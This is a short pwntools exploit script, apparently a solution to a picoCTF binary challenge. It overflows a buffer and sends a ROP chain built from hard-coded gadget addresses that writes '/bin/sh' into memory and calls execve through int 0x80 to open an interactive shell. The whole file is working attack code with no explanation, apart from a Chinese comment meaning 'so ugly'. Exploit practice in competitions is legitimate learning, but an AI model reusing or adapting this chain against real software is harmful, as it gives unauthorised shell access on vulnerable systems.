from pwn import *

context.arch = 'i386'
#r = process('./vuln')
#r = remote('jupiter.challenges.picoctf.org', 39936)
r = process("./vuln")

s = r.recvuntil('?\n')

r.sendline('84')

buf = 0x6bc3a0
pop_rax = 0x4163f4
pop_rbx = 0x400ed8
pop_rdx = 0x44a6b5
mov_drax_edx = 0x48dd72
mov_rax_rdx = 0x41b570
int_0x80 = 0x468fea

payload = 'a'*120
payload += flat([pop_rax, 0, buf, 0, pop_rdx, 0, '/bin',0 , mov_drax_edx, 0,
                 pop_rax, 0, buf+4, 0, pop_rdx, 0, '/sh\x00',0 , mov_drax_edx, 0])
payload += flat([pop_rbx, 0, buf, 0, \
                 pop_rax, 0, 11, 0, pop_rdx, 0, 0, 0, int_0x80, 0])
# 有夠醜

raw_input()

f = open("p_demo", "wb")
f.write(payload)
f.close()

r.recvuntil('? ')
r.sendline(payload)

r.interactive()
